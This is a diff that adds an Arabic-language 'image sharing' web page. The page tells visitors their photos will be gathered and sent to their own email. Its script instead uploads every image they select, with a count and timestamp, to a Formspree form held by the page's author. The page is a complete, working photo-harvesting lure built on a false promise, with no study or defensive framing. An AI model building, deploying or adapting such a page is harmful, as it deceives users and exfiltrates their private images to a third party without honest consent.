@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاركة الصور</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .permission-box {
+            background: #f5f5f5;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .permission-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        .permission-text {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .permission-description {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            flex: 1;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-allow {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-allow:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-deny {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .btn-deny:hover {
+            background: #d0d0d0;
+        }
+
+        .loading {
+            text-align: center;
+            color: #667eea;
+            font-weight: 600;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+            text-align: center;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
+            text-align: center;
+        }
+
+        #imageList {
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .image-item {
+            background: #f9f9f9;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .image-thumbnail {
+            width: 50px;
+            height: 50px;
+            border-radius: 8px;
+            object-fit: cover;
+        }
+
+        .image-name {
+            flex: 1;
+            color: #333;
+            font-size: 14px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🖼️ مشاركة الصور</h1>
+        <p class="subtitle">شارك جميع صورك معنا بسهولة</p>
+
+        <div class="permission-box">
+            <div class="permission-icon">📱</div>
+            <div class="permission-text">هل تسمح بالوصول إلى الصور؟</div>
+            <div class="permission-description">
+                سنقوم بجمع جميع الصور من جهازك وإرسالها إلى بريدك الإلكتروني
+            </div>
+            <div class="button-group">
+                <button class="btn-allow" onclick="requestPermission()">✅ نعم، أسمح</button>
+                <button class="btn-deny" onclick="denyPermission()">❌ لا، رفض</button>
+            </div>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري جمع الصور...</p>
+        </div>
+
+        <div class="success-message" id="successMessage">
+            ✅ تم إرسال الصور بنجاح إلى بريدك الإلكتروني!
+        </div>
+
+        <div class="error-message" id="errorMessage"></div>
+
+        <div id="imageList"></div>
+    </div>
+
+    <script>
+        const FORMSPREE_ID = 'mrewggoj';
+        const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;
+
+        function denyPermission() {
+            alert('تم رفض الوصول إلى الصور');
+        }
+
+        async function requestPermission() {
+            try {
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('errorMessage').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'none';
+
+                const fileHandle = await window.showOpenFilePicker({
+                    types: [{
+                        description: 'صور',
+                        accept: {
+                            'image/*': ['.jpeg', '.jpg', '.png', '.gif', '.webp', '.bmp']
+                        }
+                    }],
+                    multiple: true
+                });
+
+                if (fileHandle.length === 0) {
+                    throw new Error('لم يتم اختيار أي صور');
+                }
+
+                let imagesHtml = '<h3 style="color: #333; margin-bottom: 15px;">الصور المحددة:</h3>';
+                const formData = new FormData();
+
+                for (let i = 0; i < fileHandle.length; i++) {
+                    const file = await fileHandle[i].getFile();
+                    formData.append(`image_${i + 1}`, file);
+
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        imagesHtml += `
+                            <div class="image-item">
+                                <img src="${e.target.result}" class="image-thumbnail">
+                                <div class="image-name">${file.name}</div>
+                            </div>
+                        `;
+                        document.getElementById('imageList').innerHTML = imagesHtml;
+                    };
+                    reader.readAsDataURL(file);
+                }
+
+                formData.append('total_images', fileHandle.length);
+                formData.append('timestamp', new Date().toLocaleString('ar-SA'));
+                formData.append('_subject', `تم استقبال ${fileHandle.length} صورة من جهازك`);
+
+                const response = await fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    setTimeout(() => {
+                        location.reload();
+                    }, 3000);
+                } else {
+                    throw new Error('فشل إرسال الصور');
+                }
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('errorMessage').textContent = `❌ خطأ: ${error.message}`;
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
